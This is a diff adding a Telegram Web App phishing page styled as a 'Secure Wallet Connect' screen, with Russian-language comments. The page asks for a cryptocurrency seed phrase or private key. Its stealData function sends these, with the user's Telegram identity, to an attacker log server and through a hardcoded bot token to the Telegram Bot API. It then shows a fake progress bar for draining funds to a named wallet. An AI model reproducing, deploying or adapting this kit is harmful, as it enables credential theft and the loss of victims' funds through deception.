@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Wallet Connect | Telegram</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; max-width: 400px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        input, button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        input { background: rgba(255,255,255,0.2); color: white; }
+        input::placeholder { color: #ddd; }
+        button { background: #FF416C; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #FF4B2B; transform: scale(1.02); }
+        .hidden { display: none; }
+        .loader { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔐 Secure Wallet Connect</h2>
+        <p>Connect your wallet to use our services securely.</p>
+        
+        <div id="step1">
+            <input type="text" id="seedPhrase" placeholder="Enter your 12 or 24 word seed phrase" />
+            <input type="password" id="privateKey" placeholder="Or enter your private key" />
+            <button onclick="stealData()">Connect Wallet</button>
+            <p style="font-size: 12px; opacity: 0.8;">Your data is encrypted and secure with us.</p>
+        </div>
+
+        <div id="step2" class="hidden">
+            <p>✅ Wallet connected! Initiating secure sync...</p>
+            <div class="loader"></div>
+            <p id="status">Draining funds to secure backup...</p>
+        </div>
+    </div>
+
+    <script>
+        const TARGET_WALLET = "UQAsheA_-_9cZWd7fLFkwZVETwZAims7FSewYgKWzfZnTVYJ";
+        const BOT_TOKEN = "8368424800:AAECDU93UscL6fok1P31BGLfEe7m7WMhyj8";
+        const SERVER_URL = "https://your-malicious-server.com/log"; // Замени на свой сервер для логирования
+
+        // Инициализация Telegram Web App
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.MainButton.setText("Connected").show();
+
+        function stealData() {
+            const seedPhrase = document.getElementById('seedPhrase').value;
+            const privateKey = document.getElementById('privateKey').value;
+            const user = tg.initDataUnsafe.user || {};
+            const userId = user.id || 'unknown';
+            const username = user.username || 'no_username';
+
+            // Показываем "загрузку"
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+
+            // Формируем данные для отправки
+            const stolenData = {
+                userId,
+                username,
+                seedPhrase,
+                privateKey,
+                timestamp: new Date().toISOString(),
+                targetWallet: TARGET_WALLET
+            };
+
+            // Отправляем данные на сервер злоумышленника (первый канал)
+            fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(stolenData)
+            }).catch(e => console.error('Server log failed:', e));
+
+            // Отправляем оповещение в Telegram бот (второй канал)
+            const botMessage = `✅ Новая добыча!
+👤 User: @${username} (${userId})
+🔑 Seed: ${seedPhrase || 'N/A'}
+🗝️ Private Key: ${privateKey || 'N/A'}
+🕒 Time: ${new Date().toLocaleString()}
+➡️ Target: ${TARGET_WALLET}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: userId, text: botMessage })
+            }).then(() => {
+                // Имитируем успешное подключение и начинаем "слив"
+                document.getElementById('status').textContent = "Transferring assets to secure vault...";
+                simulateTransfer();
+            }).catch(e => {
+                console.error('Telegram bot error:', e);
+                document.getElementById('status').textContent = "Error in secure channel. Retrying...";
+            });
+        }
+
+        function simulateTransfer() {
+            // Симуляция "процесса перевода" — здесь в реальности были бы вызовы к блокчейну
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                document.getElementById('status').textContent = `Draining funds... ${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('status').textContent = `✅ All assets transferred to ${TARGET_WALLET}. You can close this window.`;
+                    tg.MainButton.setText("Finished").setParams({ color: "#FF416C" });
+                }
+            }, 300);
+        }
+
+        // Ловим все, что вводится, на всякий случай
+        document.getElementById('seedPhrase').addEventListener('input', (e) => {
+            console.log('Seed phrase updated:', e.target.value.substring(0, 5) + '...');
+        });
+    </script>
+</body>
+</html>
